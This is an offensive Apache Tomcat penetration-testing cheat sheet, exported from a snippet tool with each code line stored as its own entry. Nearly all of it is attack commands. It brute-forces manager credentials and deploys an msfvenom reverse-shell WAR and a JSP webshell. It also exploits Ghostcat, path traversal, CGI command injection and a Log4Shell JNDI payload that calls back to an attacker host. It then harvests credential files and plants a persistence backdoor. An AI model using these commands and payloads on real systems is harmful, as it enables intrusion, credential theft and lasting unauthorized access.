---
id: "reqxrnjdqmptlvcse"
title: "tomcat"
description: ""
tags: []
order: 18
createdAt: "2026-05-31T09:57:02.462Z"
updatedAt: "2026-05-31T09:57:15.703Z"
---

## Reconnaissance
<!-- section: {"id":"ngeuimfmkmptlvjte","order":0,"collapsed":false} -->

### lc46w1htqmptlvjvd
```bash
nmap -sV -sC -p 8080,8443,8009,8005 $TARGET
```

_Reconnaissance Detect Tomcat version and management interfaces._

**Tags:** tomcat, recon, nmap, rustscan
<!-- cmd: {"id":"lc46w1htqmptlvjvd","language":"bash","sectionId":"ngeuimfmkmptlvjte","tags":["tomcat","recon","nmap","rustscan"]} -->

### f0avz9nlpmptlvjvj
```bash
rustscan -a $TARGET -p 8080,8443,8009 -- -sV -sC
```

**Tags:** tomcat, recon, nmap, rustscan
<!-- cmd: {"id":"f0avz9nlpmptlvjvj","language":"bash","sectionId":"ngeuimfmkmptlvjte","tags":["tomcat","recon","nmap","rustscan"]} -->

### dlm7kothemptlvjvp
```bash
curl -sI http://$TARGET:8080/ | grep -i server
```

**Tags:** tomcat, recon, nmap, rustscan
<!-- cmd: {"id":"dlm7kothemptlvjvp","language":"bash","sectionId":"ngeuimfmkmptlvjte","tags":["tomcat","recon","nmap","rustscan"]} -->

### y43uu2as9mptlvjvu
```bash
curl -s http://$TARGET:8080/ | grep -i tomcat
```

**Tags:** tomcat, recon, nmap, rustscan
<!-- cmd: {"id":"y43uu2as9mptlvjvu","language":"bash","sectionId":"ngeuimfmkmptlvjte","tags":["tomcat","recon","nmap","rustscan"]} -->

### 0ju9yzh6mmptlvjvz
```bash
nmap -p 8080 --script=http-title,http-server-header,tomcat-headers $TARGET
```

**Tags:** tomcat, recon, nmap, rustscan
<!-- cmd: {"id":"0ju9yzh6mmptlvjvz","language":"bash","sectionId":"ngeuimfmkmptlvjte","tags":["tomcat","recon","nmap","rustscan"]} -->

## Manager Interface Discovery
<!-- section: {"id":"2bmcydrp4mptlvjtk","order":1,"collapsed":false} -->

### p3rws3qvomptlvjwc
```bash
curl -s http://$TARGET:8080/manager/html -o /dev/null -w "%{http_code}"
```

_Manager Interface Discovery_

**Tags:** tomcat, manager, enumeration, discovery
<!-- cmd: {"id":"p3rws3qvomptlvjwc","language":"bash","sectionId":"2bmcydrp4mptlvjtk","tags":["tomcat","manager","enumeration","discovery"]} -->

### glmm0bw97mptlvjwi
```bash
curl -s http://$TARGET:8080/manager/status
```

**Tags:** tomcat, manager, enumeration, discovery
<!-- cmd: {"id":"glmm0bw97mptlvjwi","language":"bash","sectionId":"2bmcydrp4mptlvjtk","tags":["tomcat","manager","enumeration","discovery"]} -->

### as2snycxumptlvjwm
```bash
curl -s http://$TARGET:8080/host-manager/html -o /dev/null -w "%{http_code}"
```

**Tags:** tomcat, manager, enumeration, discovery
<!-- cmd: {"id":"as2snycxumptlvjwm","language":"bash","sectionId":"2bmcydrp4mptlvjtk","tags":["tomcat","manager","enumeration","discovery"]} -->

### 18eatbqoxmptlvjwr
```bash
curl -s http://$TARGET:8080/manager/text/list
```

**Tags:** tomcat, manager, enumeration, discovery
<!-- cmd: {"id":"18eatbqoxmptlvjwr","language":"bash","sectionId":"2bmcydrp4mptlvjtk","tags":["tomcat","manager","enumeration","discovery"]} -->

### qpu988rslmptlvjww
```bash
for path in /manager/html /manager/text /manager/jmxproxy /host-manager/html /admin; do
```

**Tags:** tomcat, manager, enumeration, discovery
<!-- cmd: {"id":"qpu988rslmptlvjww","language":"bash","sectionId":"2bmcydrp4mptlvjtk","tags":["tomcat","manager","enumeration","discovery"]} -->

### b2y8nw09xmptlvjx1
```bash
  code=$(curl -so /dev/null -w "%{http_code}" http://$TARGET:8080$path)
```

**Tags:** tomcat, manager, enumeration, discovery
<!-- cmd: {"id":"b2y8nw09xmptlvjx1","language":"bash","sectionId":"2bmcydrp4mptlvjtk","tags":["tomcat","manager","enumeration","discovery"]} -->

### q6cfnvz8zmptlvjx6
```bash
  echo "$code $path"
```

**Tags:** tomcat, manager, enumeration, discovery
<!-- cmd: {"id":"q6cfnvz8zmptlvjx6","language":"bash","sectionId":"2bmcydrp4mptlvjtk","tags":["tomcat","manager","enumeration","discovery"]} -->

### yea83yylqmptlvjxa
```bash
done
```

**Tags:** tomcat, manager, enumeration, discovery
<!-- cmd: {"id":"yea83yylqmptlvjxa","language":"bash","sectionId":"2bmcydrp4mptlvjtk","tags":["tomcat","manager","enumeration","discovery"]} -->

## Brute Force Manager Credentials
<!-- section: {"id":"cgsk3sjq5mptlvjtp","order":2,"collapsed":false} -->

### 9udhwwklemptlvjxp
```bash
hydra -L /usr/share/wordlists/tomcat-users.txt -P /usr/share/wordlists/tomcat-pass.txt \
```

_Brute Force Manager Credentials_

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"9udhwwklemptlvjxp","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

### g09f7024imptlvjxt
```bash
  http-get://$TARGET:8080/manager/html
```

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"g09f7024imptlvjxt","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

### kcygw3wv2mptlvjxy
```bash
use auxiliary/scanner/http/tomcat_mgr_login
```

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"kcygw3wv2mptlvjxy","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

### gid90del0mptlvjy3
```bash
set RHOSTS $TARGET
```

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"gid90del0mptlvjy3","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

### 61rp7ex46mptlvjy8
```bash
set RPORT 8080
```

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"61rp7ex46mptlvjy8","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

### k2ui5y676mptlvjye
```bash
set VHOST $TARGET
```

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"k2ui5y676mptlvjye","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

### ty4394y1dmptlvjyj
```bash
run
```

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"ty4394y1dmptlvjyj","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

### 25jimqqdtmptlvjyo
```bash
curl -u tomcat:tomcat http://$TARGET:8080/manager/html -o /dev/null -w "%{http_code}"
```

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"25jimqqdtmptlvjyo","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

### 06bucs0hjmptlvjyu
```bash
curl -u admin:admin http://$TARGET:8080/manager/html -o /dev/null -w "%{http_code}"
```

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"06bucs0hjmptlvjyu","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

### hl7yz4nf8mptlvjyz
```bash
netexec http $TARGET -p 8080 -u tomcat -p /usr/share/wordlists/rockyou.txt --path /manager/html
```

**Tags:** tomcat, bruteforce, hydra, metasploit
<!-- cmd: {"id":"hl7yz4nf8mptlvjyz","language":"bash","sectionId":"cgsk3sjq5mptlvjtp","tags":["tomcat","bruteforce","hydra","metasploit"]} -->

## RCE via Manager — WAR Deployment
<!-- section: {"id":"nmm65r8pmmptlvjtu","order":3,"collapsed":false} -->

### ydt5ewe79mptlvjzf
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war
```

_RCE via Manager — WAR Deployment Deploy malicious WAR file through Tomcat Manager._

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"ydt5ewe79mptlvjzf","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### kinlrf6w8mptlvjzl
```bash
curl -u $USER:$PASS http://$TARGET:8080/manager/text/deploy?path=/shell --upload-file shell.war
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"kinlrf6w8mptlvjzl","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### yzu6ok9znmptlvjzr
```bash
curl http://$TARGET:8080/shell/
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"yzu6ok9znmptlvjzr","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### 3oswzvfmcmptlvjzw
```bash
curl -u $USER:$PASS http://$TARGET:8080/manager/html/upload \
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"3oswzvfmcmptlvjzw","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### oahgnriyamptlvk00
```bash
  -F "file=@shell.war;type=application/octet-stream"
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"oahgnriyamptlvk00","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### pcfex4q4kmptlvk05
```bash
use exploit/multi/http/tomcat_mgr_upload
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"pcfex4q4kmptlvk05","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### 1f6envpw8mptlvk0a
```bash
set RHOSTS $TARGET
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"1f6envpw8mptlvk0a","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### evucp1w12mptlvk0f
```bash
set RPORT 8080
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"evucp1w12mptlvk0f","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### m1axogtiimptlvk0k
```bash
set HttpUsername $USER
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"m1axogtiimptlvk0k","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### 0w1erbj3omptlvk0p
```bash
set HttpPassword $PASS
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"0w1erbj3omptlvk0p","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### tvaig8i8ymptlvk0t
```bash
set LHOST $LHOST
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"tvaig8i8ymptlvk0t","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### fcryd66m7mptlvk0y
```bash
run
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"fcryd66m7mptlvk0y","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

### elg888bwkmptlvk13
```bash
curl -u $USER:$PASS "http://$TARGET:8080/manager/text/undeploy?path=/shell"
```

**Tags:** tomcat, war, rce, exploitation, manager
<!-- cmd: {"id":"elg888bwkmptlvk13","language":"bash","sectionId":"nmm65r8pmmptlvjtu","tags":["tomcat","war","rce","exploitation","manager"]} -->

## RCE via Manager — Text API
<!-- section: {"id":"wcx9q7k5dmptlvjtz","order":4,"collapsed":false} -->

### ms7v0vaodmptlvk1h
```bash
curl -u $USER:$PASS http://$TARGET:8080/manager/text/list
```

_RCE via Manager — Text API_

**Tags:** tomcat, manager, text-api, exploitation
<!-- cmd: {"id":"ms7v0vaodmptlvk1h","language":"bash","sectionId":"wcx9q7k5dmptlvjtz","tags":["tomcat","manager","text-api","exploitation"]} -->

### ewuz1adwgmptlvk1m
```bash
curl -u $USER:$PASS http://$TARGET:8080/manager/text/serverinfo
```

**Tags:** tomcat, manager, text-api, exploitation
<!-- cmd: {"id":"ewuz1adwgmptlvk1m","language":"bash","sectionId":"wcx9q7k5dmptlvjtz","tags":["tomcat","manager","text-api","exploitation"]} -->

### h30874j14mptlvk1r
```bash
curl -u $USER:$PASS "http://$TARGET:8080/manager/text/deploy?path=/shell&war=http://$LHOST:8080/shell.war"
```

**Tags:** tomcat, manager, text-api, exploitation
<!-- cmd: {"id":"h30874j14mptlvk1r","language":"bash","sectionId":"wcx9q7k5dmptlvjtz","tags":["tomcat","manager","text-api","exploitation"]} -->

### jglyf1gntmptlvk1v
```bash
curl -u $USER:$PASS "http://$TARGET:8080/manager/text/stop?path=/app"
```

**Tags:** tomcat, manager, text-api, exploitation
<!-- cmd: {"id":"jglyf1gntmptlvk1v","language":"bash","sectionId":"wcx9q7k5dmptlvjtz","tags":["tomcat","manager","text-api","exploitation"]} -->

### y7dqczygrmptlvk20
```bash
curl -u $USER:$PASS "http://$TARGET:8080/manager/text/start?path=/app"
```

**Tags:** tomcat, manager, text-api, exploitation
<!-- cmd: {"id":"y7dqczygrmptlvk20","language":"bash","sectionId":"wcx9q7k5dmptlvjtz","tags":["tomcat","manager","text-api","exploitation"]} -->

## AJP Connector — Ghostcat (CVE-2020-1938)
<!-- section: {"id":"cx4u7gxhymptlvju4","order":5,"collapsed":false} -->

### zuoro59y7mptlvk2a
```bash
nmap -p 8009 $TARGET
```

_AJP Connector — Ghostcat (CVE-2020-1938) AJP port 8009 — read files from webapp or RCE via file upload._

**Tags:** tomcat, ajp, ghostcat, cve, exploitation
<!-- cmd: {"id":"zuoro59y7mptlvk2a","language":"bash","sectionId":"cx4u7gxhymptlvju4","tags":["tomcat","ajp","ghostcat","cve","exploitation"]} -->

### 3y0jduumkmptlvk2f
```bash
python3 ghostcat.py $TARGET
```

**Tags:** tomcat, ajp, ghostcat, cve, exploitation
<!-- cmd: {"id":"3y0jduumkmptlvk2f","language":"bash","sectionId":"cx4u7gxhymptlvju4","tags":["tomcat","ajp","ghostcat","cve","exploitation"]} -->

### 17eg9j9fmmptlvk2k
```bash
python3 ghostcat.py -p 8009 -f WEB-INF/web.xml $TARGET
```

**Tags:** tomcat, ajp, ghostcat, cve, exploitation
<!-- cmd: {"id":"17eg9j9fmmptlvk2k","language":"bash","sectionId":"cx4u7gxhymptlvju4","tags":["tomcat","ajp","ghostcat","cve","exploitation"]} -->

### 1aqmj20a5mptlvk2p
```bash
use auxiliary/admin/http/tomcat_ghostcat
```

**Tags:** tomcat, ajp, ghostcat, cve, exploitation
<!-- cmd: {"id":"1aqmj20a5mptlvk2p","language":"bash","sectionId":"cx4u7gxhymptlvju4","tags":["tomcat","ajp","ghostcat","cve","exploitation"]} -->

### vkzhi4ijnmptlvk2u
```bash
set RHOSTS $TARGET
```

**Tags:** tomcat, ajp, ghostcat, cve, exploitation
<!-- cmd: {"id":"vkzhi4ijnmptlvk2u","language":"bash","sectionId":"cx4u7gxhymptlvju4","tags":["tomcat","ajp","ghostcat","cve","exploitation"]} -->

### skioomci3mptlvk2z
```bash
set RPORT 8009
```

**Tags:** tomcat, ajp, ghostcat, cve, exploitation
<!-- cmd: {"id":"skioomci3mptlvk2z","language":"bash","sectionId":"cx4u7gxhymptlvju4","tags":["tomcat","ajp","ghostcat","cve","exploitation"]} -->

### lv03rt483mptlvk32
```bash
run
```

**Tags:** tomcat, ajp, ghostcat, cve, exploitation
<!-- cmd: {"id":"lv03rt483mptlvk32","language":"bash","sectionId":"cx4u7gxhymptlvju4","tags":["tomcat","ajp","ghostcat","cve","exploitation"]} -->

### o2i4igdnwmptlvk37
```bash
nuclei -u $TARGET -tags ghostcat,ajp,cve-2020-1938
```

**Tags:** tomcat, ajp, ghostcat, cve, exploitation
<!-- cmd: {"id":"o2i4igdnwmptlvk37","language":"bash","sectionId":"cx4u7gxhymptlvju4","tags":["tomcat","ajp","ghostcat","cve","exploitation"]} -->

## JSP Webshell
<!-- section: {"id":"u4102jtmgmptlvju8","order":6,"collapsed":false} -->

### 1u43s9v8rmptlvk3m
```bash
cat > shell.jsp << 'EOF'
```

_JSP Webshell_

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"1u43s9v8rmptlvk3m","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### qs2okuks1mptlvk3r
```bash
<%@ page import="java.io.*" %>
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"qs2okuks1mptlvk3r","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### glatl7m4tmptlvk3x
```bash
<%
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"glatl7m4tmptlvk3x","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### tnbo5wvmdmptlvk42
```bash
  String cmd = request.getParameter("cmd");
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"tnbo5wvmdmptlvk42","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### u9xhtyrg0mptlvk46
```bash
  Process p = Runtime.getRuntime().exec(cmd);
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"u9xhtyrg0mptlvk46","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### n8f73852smptlvk4b
```bash
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"n8f73852smptlvk4b","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### 1lfv2hx37mptlvk4f
```bash
  String line;
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"1lfv2hx37mptlvk4f","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### 68in41351mptlvk4l
```bash
  while((line=br.readLine())!=null) out.println(line + "<br>");
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"68in41351mptlvk4l","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### l5ikpt2aymptlvk4q
```bash
%>
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"l5ikpt2aymptlvk4q","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### 0jmapcv5mmptlvk4t
```bash
EOF
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"0jmapcv5mmptlvk4t","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### v51z0qnckmptlvk4y
```bash
mkdir -p wardir/WEB-INF
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"v51z0qnckmptlvk4y","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### x6vzw44wymptlvk53
```bash
cat > wardir/WEB-INF/web.xml << 'EOF'
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"x6vzw44wymptlvk53","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### pq4r75bvumptlvk59
```bash
<?xml version="1.0"?>
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"pq4r75bvumptlvk59","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### cbsum609dmptlvk5e
```bash
<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"cbsum609dmptlvk5e","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### bq1n77ehymptlvk5i
```bash
  <servlet><servlet-name>s</servlet-name><servlet-class>org.apache.jsp.shell_jsp</servlet-class></servlet>
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"bq1n77ehymptlvk5i","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### hb4djyo9vmptlvk5n
```bash
  <servlet-mapping><servlet-name>s</servlet-name><url-pattern>/shell.jsp</url-pattern></servlet-mapping>
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"hb4djyo9vmptlvk5n","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### oy4x3f0u8mptlvk5s
```bash
</web-app>
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"oy4x3f0u8mptlvk5s","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### b0u6v4735mptlvk5x
```bash
EOF
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"b0u6v4735mptlvk5x","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### x9qjhao6zmptlvk63
```bash
cp shell.jsp wardir/
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"x9qjhao6zmptlvk63","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### 36rxw8z0wmptlvk67
```bash
cd wardir && jar -cvf ../shell.war *
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"36rxw8z0wmptlvk67","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

### qd0rhz11emptlvk6d
```bash
curl "http://$TARGET:8080/shell/shell.jsp?cmd=id"
```

**Tags:** tomcat, webshell, jsp, exploitation
<!-- cmd: {"id":"qd0rhz11emptlvk6d","language":"bash","sectionId":"u4102jtmgmptlvju8","tags":["tomcat","webshell","jsp","exploitation"]} -->

## Information Disclosure
<!-- section: {"id":"33dn098ygmptlvjud","order":7,"collapsed":false} -->

### sfxue9p74mptlvk6v
```bash
curl -s http://$TARGET:8080/XXXXXXX
```

_Information Disclosure_

**Tags:** tomcat, information-disclosure, enumeration
<!-- cmd: {"id":"sfxue9p74mptlvk6v","language":"bash","sectionId":"33dn098ygmptlvjud","tags":["tomcat","information-disclosure","enumeration"]} -->

### mi9xeharemptlvk70
```bash
curl -s http://$TARGET:8080/. | grep -i tomcat
```

**Tags:** tomcat, information-disclosure, enumeration
<!-- cmd: {"id":"mi9xeharemptlvk70","language":"bash","sectionId":"33dn098ygmptlvjud","tags":["tomcat","information-disclosure","enumeration"]} -->

### 7lnvsxca9mptlvk75
```bash
curl -s http://$TARGET:8080/server-status
```

**Tags:** tomcat, information-disclosure, enumeration
<!-- cmd: {"id":"7lnvsxca9mptlvk75","language":"bash","sectionId":"33dn098ygmptlvjud","tags":["tomcat","information-disclosure","enumeration"]} -->

### lfodeutljmptlvk79
```bash
curl -s http://$TARGET:8080/examples/servlets/
```

**Tags:** tomcat, information-disclosure, enumeration
<!-- cmd: {"id":"lfodeutljmptlvk79","language":"bash","sectionId":"33dn098ygmptlvjud","tags":["tomcat","information-disclosure","enumeration"]} -->

### ek9fo83onmptlvk7f
```bash
curl -s http://$TARGET:8080/examples/jsp/
```

**Tags:** tomcat, information-disclosure, enumeration
<!-- cmd: {"id":"ek9fo83onmptlvk7f","language":"bash","sectionId":"33dn098ygmptlvjud","tags":["tomcat","information-disclosure","enumeration"]} -->

### ytuodmqlomptlvk7k
```bash
curl -s "http://$TARGET:8080/app/%252e%252e%252fWEB-INF/web.xml"
```

**Tags:** tomcat, information-disclosure, enumeration
<!-- cmd: {"id":"ytuodmqlomptlvk7k","language":"bash","sectionId":"33dn098ygmptlvjud","tags":["tomcat","information-disclosure","enumeration"]} -->

### sky64carpmptlvk7n
```bash
curl -s "http://$TARGET:8080/..%2F..%2FWEB-INF%2Fweb.xml"
```

**Tags:** tomcat, information-disclosure, enumeration
<!-- cmd: {"id":"sky64carpmptlvk7n","language":"bash","sectionId":"33dn098ygmptlvjud","tags":["tomcat","information-disclosure","enumeration"]} -->

## Common CVEs
<!-- section: {"id":"nn4ajoz42mptlvjui","order":8,"collapsed":false} -->

### a0cicm402mptlvk7y
```bash
curl "http://$TARGET:8080/cgi-bin/test.bat?&C%3A%5CWindows%5CSystem32%5Ccmd.exe+%2Fc+dir"
```

_Common CVEs_

**Tags:** tomcat, cve, exploitation, struts
<!-- cmd: {"id":"a0cicm402mptlvk7y","language":"bash","sectionId":"nn4ajoz42mptlvjui","tags":["tomcat","cve","exploitation","struts"]} -->

### mf8hau8eamptlvk83
```bash
curl -X PUT "http://$TARGET:8080/shell.jsp/" --data-binary @shell.jsp
```

**Tags:** tomcat, cve, exploitation, struts
<!-- cmd: {"id":"mf8hau8eamptlvk83","language":"bash","sectionId":"nn4ajoz42mptlvjui","tags":["tomcat","cve","exploitation","struts"]} -->

### 6pjvgbo3imptlvk87
```bash
curl -H 'X-Api-Version: ${jndi:ldap://$LHOST:1389/exploit}' http://$TARGET:8080/
```

**Tags:** tomcat, cve, exploitation, struts
<!-- cmd: {"id":"6pjvgbo3imptlvk87","language":"bash","sectionId":"nn4ajoz42mptlvjui","tags":["tomcat","cve","exploitation","struts"]} -->

### d8wxgrcufmptlvk8c
```bash
nuclei -u http://$TARGET:8080 -tags tomcat,apache,cve
```

**Tags:** tomcat, cve, exploitation, struts
<!-- cmd: {"id":"d8wxgrcufmptlvk8c","language":"bash","sectionId":"nn4ajoz42mptlvjui","tags":["tomcat","cve","exploitation","struts"]} -->

## Configuration Files (Post-Exploitation)
<!-- section: {"id":"93o9gy9fwmptlvjum","order":9,"collapsed":false} -->

### 36nfwxb9mmptlvk9a
```bash
find / -name "tomcat-users.xml" 2>/dev/null
```

_Configuration Files (Post-Exploitation)_

**Tags:** tomcat, configuration, credentials, post-exploitation
<!-- cmd: {"id":"36nfwxb9mmptlvk9a","language":"bash","sectionId":"93o9gy9fwmptlvjum","tags":["tomcat","configuration","credentials","post-exploitation"]} -->

### epanqnkoumptlvk9f
```bash
cat /etc/tomcat*/tomcat-users.xml
```

**Tags:** tomcat, configuration, credentials, post-exploitation
<!-- cmd: {"id":"epanqnkoumptlvk9f","language":"bash","sectionId":"93o9gy9fwmptlvjum","tags":["tomcat","configuration","credentials","post-exploitation"]} -->

### pqubsen1zmptlvk9k
```bash
cat /opt/tomcat/conf/tomcat-users.xml
```

**Tags:** tomcat, configuration, credentials, post-exploitation
<!-- cmd: {"id":"pqubsen1zmptlvk9k","language":"bash","sectionId":"93o9gy9fwmptlvjum","tags":["tomcat","configuration","credentials","post-exploitation"]} -->

### jc2oo6153mptlvk9p
```bash
cat $CATALINA_HOME/conf/tomcat-users.xml
```

**Tags:** tomcat, configuration, credentials, post-exploitation
<!-- cmd: {"id":"jc2oo6153mptlvk9p","language":"bash","sectionId":"93o9gy9fwmptlvjum","tags":["tomcat","configuration","credentials","post-exploitation"]} -->

### rf9aerq00mptlvk9u
```bash
cat $CATALINA_HOME/conf/server.xml          # Connector config, SSL keys
```

**Tags:** tomcat, configuration, credentials, post-exploitation
<!-- cmd: {"id":"rf9aerq00mptlvk9u","language":"bash","sectionId":"93o9gy9fwmptlvjum","tags":["tomcat","configuration","credentials","post-exploitation"]} -->

### 84y176flcmptlvk9z
```bash
cat $CATALINA_HOME/conf/context.xml         # DB connections
```

**Tags:** tomcat, configuration, credentials, post-exploitation
<!-- cmd: {"id":"84y176flcmptlvk9z","language":"bash","sectionId":"93o9gy9fwmptlvjum","tags":["tomcat","configuration","credentials","post-exploitation"]} -->

### xso3aqh7imptlvka4
```bash
cat $CATALINA_HOME/conf/web.xml
```

**Tags:** tomcat, configuration, credentials, post-exploitation
<!-- cmd: {"id":"xso3aqh7imptlvka4","language":"bash","sectionId":"93o9gy9fwmptlvjum","tags":["tomcat","configuration","credentials","post-exploitation"]} -->

### vsgnbza2qmptlvka9
```bash
find /opt/tomcat /var/lib/tomcat* -name "web.config" -o -name "*.properties" 2>/dev/null
```

**Tags:** tomcat, configuration, credentials, post-exploitation
<!-- cmd: {"id":"vsgnbza2qmptlvka9","language":"bash","sectionId":"93o9gy9fwmptlvjum","tags":["tomcat","configuration","credentials","post-exploitation"]} -->

### nvjd8ldormptlvkae
```bash
grep -r "password\|username\|secret\|connectionString" /opt/tomcat/ 2>/dev/null
```

**Tags:** tomcat, configuration, credentials, post-exploitation
<!-- cmd: {"id":"nvjd8ldormptlvkae","language":"bash","sectionId":"93o9gy9fwmptlvjum","tags":["tomcat","configuration","credentials","post-exploitation"]} -->

## Persistence
<!-- section: {"id":"vgcvvta6tmptlvjur","order":10,"collapsed":false} -->

### uoaoczkw3mptlvkap
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o backdoor.war
```

_Persistence_

**Tags:** tomcat, persistence, backdoor
